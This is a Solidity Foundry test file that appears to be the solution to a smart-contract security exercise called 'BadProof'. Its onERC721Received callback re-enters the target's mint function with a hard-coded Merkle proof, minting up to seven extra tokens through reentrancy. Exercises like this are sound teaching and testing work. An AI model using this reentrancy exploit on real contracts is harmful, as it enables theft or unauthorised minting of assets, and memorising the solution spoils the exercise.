// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {BadProofBaseTest} from "./BadProofBase.t.sol";

interface IBadProof {
    function mint(address addr, bytes32[] memory proof) external;
    function genNode(address addr, uint256 tokenId) external returns (bytes32);
}

interface IERC721TokenReceiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

contract BadProofTest is BadProofBaseTest {
    // NOTE: The proof for the attacker contract is as follows:
    // proof[0] = 0xc471bda26e2e9f486b58f8f86bf6b700bb9d0db6dafabec4ee3f352a216fc396
    // proof[1] = 0x2357f919416fa706364ed9497630e70c41e2e43d16665f71375e9fef824c381c
    // proof[2] = 0x7410dc0396cf7f6d7d7be35e28840e3af1ec80b7bf609b2b650a8d3534ddaa12
    uint256 count = 0;
    function testExploit() public validation {
        bytes32[] memory proof2 = new bytes32[](3);
        proof2[0] = 0xc471bda26e2e9f486b58f8f86bf6b700bb9d0db6dafabec4ee3f352a216fc396;
        proof2[1] = 0x2357f919416fa706364ed9497630e70c41e2e43d16665f71375e9fef824c381c;
        proof2[2] = 0x7410dc0396cf7f6d7d7be35e28840e3af1ec80b7bf609b2b650a8d3534ddaa12;

        token.mint(address(this), proof2);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        attack();
        return IERC721TokenReceiver.onERC721Received.selector;
    }

    function attack() public {
        count += 1;
        bytes32[] memory proof2 = new bytes32[](3);
        proof2[0] = 0xc471bda26e2e9f486b58f8f86bf6b700bb9d0db6dafabec4ee3f352a216fc396;
        proof2[1] = 0x2357f919416fa706364ed9497630e70c41e2e43d16665f71375e9fef824c381c;
        proof2[2] = 0x7410dc0396cf7f6d7d7be35e28840e3af1ec80b7bf609b2b650a8d3534ddaa12;
        
        if (count < 7) {
            token.mint(address(this), proof2);
        }
    }
}
